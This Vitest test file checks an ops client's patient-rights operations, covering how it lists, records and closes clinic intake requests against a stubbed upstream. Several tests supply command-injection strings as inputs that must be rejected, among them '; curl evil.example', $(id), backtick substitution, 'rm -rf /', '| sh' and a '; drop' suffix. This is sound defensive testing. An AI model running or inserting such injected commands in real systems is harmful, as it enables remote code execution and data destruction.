import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";

/**
 * The ops client's patient-rights operations (lane P6c; apps/app
 * lib/ops/rights-ops.ts) against a stubbed upstream: each call sends exactly
 * the op and args apps/app reads, and each reply is read field by field, so
 * a shape apps/app does not send, or a command that is anything but the
 * run-task.sh line built from ids and fixed words, is a malformed answer,
 * never a half-read page. The session check and the browser headers are
 * stubbed; the signing, the transport and the readers are the real ones.
 */

vi.mock("@/lib/admin/operator", () => ({ requireOperator: async () => "ops@healdesk.test" }));
vi.mock("next/headers", () => ({
  headers: async () => new Headers({ "user-agent": "vitest", "x-forwarded-for": "203.0.113.9" }),
}));

import { closeRightsIntake, fetchRights, recordRightsIntake, type RightsRowView } from "@/lib/admin/ops-client";

const CLINIC = "3fa85f64-5717-4562-b3fc-2c963f66afa6";
const INTAKE = "5c0ffee0-1111-4c2a-9a8b-1f2e3d4c5b6a";
const RECORD = "9a8b7c6d-1111-4222-8333-444455556666";
const KEY = "0b5e1c2d-3f40-4a51-8b62-7c83d94ea5f6";

let replies: { status?: number; body: unknown }[] = [];
let sent: { op: string; args: Record<string, unknown> }[] = [];

function reply(body: unknown, status = 200): void {
  replies.push({ status, body });
}

beforeEach(() => {
  replies = [];
  sent = [];
  vi.stubEnv("HEALDESK_PROVISION_SECRET", "test-provision-secret");
  vi.stubEnv("HEALDESK_APP_URL", "http://ops.internal.test");
  vi.stubGlobal(
    "fetch",
    vi.fn(async (_url: unknown, init: { body: string }) => {
      const envelope = JSON.parse(init.body) as { op: string; args: Record<string, unknown> };
      sent.push({ op: envelope.op, args: envelope.args });
      const next = replies.shift();
      if (!next) throw new Error("no stubbed reply");
      return new Response(JSON.stringify(next.body), {
        status: next.status ?? 200,
        headers: { "content-type": "application/json" },
      });
    }),
  );
  vi.spyOn(console, "error").mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

const COMMAND = `bash infra/aws/scripts/run-task.sh patient-request ${CLINIC} access ops@healdesk.test 2026-10-21`;

const TO_RUN: RightsRowView = {
  id: INTAKE,
  source: "intake",
  intakeId: INTAKE,
  recordId: null,
  clinicId: CLINIC,
  clinicName: "Radiance Med Spa",
  kind: "patient_request",
  askedFor: "access",
  verifiedVia: "unverified",
  receivedOn: "2026-10-21",
  dueOn: "2026-10-28",
  dueDerived: false,
  daysLeft: 4,
  state: "on_time",
  command: COMMAND,
  commandNote: null,
  retellStep: null,
  backupExpiresOn: null,
  closedOn: null,
};

const BLOCKED: RightsRowView = {
  ...TO_RUN,
  id: RECORD,
  intakeId: RECORD,
  kind: "erasure",
  askedFor: null,
  verifiedVia: "notice_address",
  dueOn: "2026-11-03",
  daysLeft: -1,
  state: "blocked",
  command: null,
  commandNote: "No portal route yet turns this request into a contact id",
};

describe("fetchRights", () => {
  test("sends only what was asked and reads every row field by field", async () => {
    reply({ data: { rows: [TO_RUN, BLOCKED], count: 2, truncated: false, unreadClinics: 0 } });
    expect(await fetchRights()).toEqual({ ok: true, data: { rows: [TO_RUN, BLOCKED], count: 2, truncated: false, unreadClinics: 0 } });
    expect(sent).toEqual([{ op: "listRights", args: {} }]);

    reply({ data: { rows: [], count: 0, truncated: false, unreadClinics: 1 } });
    await fetchRights({ status: "all", limit: 50, includeDemo: true });
    expect(sent[1]).toEqual({ op: "listRights", args: { status: "all", limit: 50, includeDemo: true } });
  });

  test("a command that is not the run-task line of ids and fixed words is a malformed answer", async () => {
    for (const command of [
      `${COMMAND}; curl evil.example`,
      `${COMMAND} $(id)`,
      `${COMMAND} \`id\``,
      `bash infra/aws/scripts/run-task.sh db-apply x ${CLINIC} apply 1`,
      `rm -rf / ${CLINIC}`,
      `${COMMAND} | sh`,
    ]) {
      reply({ data: { rows: [{ ...TO_RUN, command }], count: 1, truncated: false, unreadClinics: 0 } });
      expect((await fetchRights()).ok, command).toBe(false);
    }
  });

  test("every fixed note apps/app sends is read, word for word", async () => {
    for (const commandNote of [
      "No portal route yet takes the practice's words for an amendment on the host",
      "No portal route yet takes a correction's new values on the host",
      "Recorded on the host: matched by its day and what was asked",
    ]) {
      reply({ data: { rows: [{ ...BLOCKED, commandNote }], count: 1, truncated: false, unreadClinics: 0 } });
      expect((await fetchRights()).ok, commandNote).toBe(true);
    }
  });

  test("an extra field, an unknown state or a note that is not one of the two is malformed", async () => {
    for (const row of [
      { ...TO_RUN, contactId: RECORD },
      { ...TO_RUN, state: "late" },
      { ...BLOCKED, commandNote: "Call Sam on 555 0131" },
      { ...BLOCKED, commandNote: "No portal route yet" },
      { ...TO_RUN, receivedOn: "21 October" },
      { ...TO_RUN, kind: "deletion" },
    ]) {
      reply({ data: { rows: [row], count: 1, truncated: false, unreadClinics: 0 } });
      expect((await fetchRights()).ok, JSON.stringify(row)).toBe(false);
    }
  });
});

describe("recordRightsIntake", () => {
  test("sends the ids, closed words and the day, and reads the outcome", async () => {
    reply({ data: { outcome: "recorded", id: INTAKE, dueOn: "2026-10-28", auditRecorded: true } });
    const out = await recordRightsIntake({
      clinicId: CLINIC,
      requestKey: KEY,
      kind: "patient_request",
      receivedOn: "2026-10-21",
      verifiedVia: "unverified",
      askedFor: "access",
    });
    expect(out).toEqual({ ok: true, data: { outcome: "recorded", id: INTAKE, dueOn: "2026-10-28", auditRecorded: true } });
    expect(sent).toEqual([
      {
        op: "recordRightsIntake",
        args: { clinicId: CLINIC, requestKey: KEY, kind: "patient_request", receivedOn: "2026-10-21", verifiedVia: "unverified", askedFor: "access" },
      },
    ]);

    reply({ data: { outcome: "already_recorded", id: INTAKE, dueOn: "2026-11-04", auditRecorded: true } });
    await recordRightsIntake({ clinicId: CLINIC, requestKey: KEY, kind: "erasure", receivedOn: "2026-10-21", verifiedVia: "notice_address", linkedRecordId: RECORD });
    expect(sent[1]!.args).toEqual({ clinicId: CLINIC, requestKey: KEY, kind: "erasure", receivedOn: "2026-10-21", verifiedVia: "notice_address", linkedRecordId: RECORD });

    reply({ data: { outcome: "saved", id: INTAKE, dueOn: "2026-10-28", auditRecorded: true } });
    expect((await recordRightsIntake({ clinicId: CLINIC, requestKey: KEY, kind: "export", receivedOn: "2026-10-21", verifiedVia: "unverified" })).ok).toBe(false);
  });

  test("a request key that is not a uuid is refused before anything is sent", async () => {
    for (const requestKey of ["", "retry-1", `${KEY}; drop`]) {
      const out = await recordRightsIntake({ clinicId: CLINIC, requestKey, kind: "export", receivedOn: "2026-10-21", verifiedVia: "unverified" });
      expect(out.ok, requestKey).toBe(false);
    }
    expect(sent).toEqual([]);
  });
});

describe("closeRightsIntake", () => {
  test("sends the clinic, the intake and done or not applicable", async () => {
    reply({ data: { outcome: "closed", status: "done", auditRecorded: true } });
    expect(await closeRightsIntake(CLINIC, INTAKE, "done")).toEqual({ ok: true, data: { outcome: "closed", status: "done", auditRecorded: true } });
    expect(sent).toEqual([{ op: "closeRightsIntake", args: { clinicId: CLINIC, id: INTAKE, status: "done" } }]);
    reply({ data: { outcome: "closed", status: "open", auditRecorded: true } });
    expect((await closeRightsIntake(CLINIC, INTAKE, "not_applicable")).ok).toBe(false);
  });
});
